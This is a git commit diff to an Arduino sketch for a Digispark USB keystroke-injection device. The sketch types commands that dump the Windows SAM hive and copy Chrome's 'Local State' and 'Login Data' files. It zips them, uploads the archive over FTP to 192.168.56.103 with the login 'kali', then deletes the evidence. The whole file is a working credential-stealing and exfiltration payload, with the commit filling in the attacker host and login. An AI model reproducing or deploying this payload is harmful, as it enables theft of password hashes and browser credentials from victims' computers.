8893abf173aee0b7327167a0f24ab2a3ec0c6dd3
Sohaib-roomi <49339026+Sohaib-roomi@users.noreply.github.com>
2023-10-18 03:59:31 +0500

    Update Keyboard.ino
    Updated the script by making it more efficient. Delay time extended.

--- Keyboard.ino
+++ Keyboard.ino
@@ -14,14 +14,15 @@ void loop() {
   DigiKeyboard.print(mode);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1400);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
 	DigiKeyboard.delay(500);
-  DigiKeyboard.print(" mkdir D:\\files");
+  DigiKeyboard.print(" mkdir C:\\files");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-  DigiKeyboard.print("reg save HKLM\\SAM d:\\files\\sam"); //copy sam or any other system files at different path
+  DigiKeyboard.print("reg save HKLM\\SAM C:\\files\\sam"); //copy sam or any other system files at different path
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
@@ -32,26 +33,26 @@ void loop() {
 	DigiKeyboard.print("cd AppData\\Local\\Google\\chrome\\'User Data'");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("copy 'Local State' D:\\files\\"); //copying Local State file
+	DigiKeyboard.print("copy 'Local State' C:\\files\\"); //copying Local State file
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("copy Default\\'Login Data' D:\\files\\"); //copying Login Data file
+	DigiKeyboard.print("copy Default\\'Login Data' C:\\files\\"); //copying Login Data file
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
-	DigiKeyboard.print("cd D:\\");
+	DigiKeyboard.print("cd C:\\");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(600);
 	DigiKeyboard.print("Compress-Archive files files.zip");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
 	DigiKeyboard.delay(1500);
-  DigiKeyboard.print("ftp {ip_address}"); //accessing ftp server
+  DigiKeyboard.print("ftp 192.168.56.103"); //accessing ftp server
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
-  DigiKeyboard.print("username"); // username of ftp
+  DigiKeyboard.print("kali"); // username of ftp
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
-  DigiKeyboard.print("password"); //password of ftp
+  DigiKeyboard.print("kali"); //password of ftp
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
   DigiKeyboard.print("cd Desktop"); // ftp directory in which you want to copy the files 
@@ -76,6 +77,9 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("del files.zip");
   DigiKeyboard.delay(600);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("y"); 
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
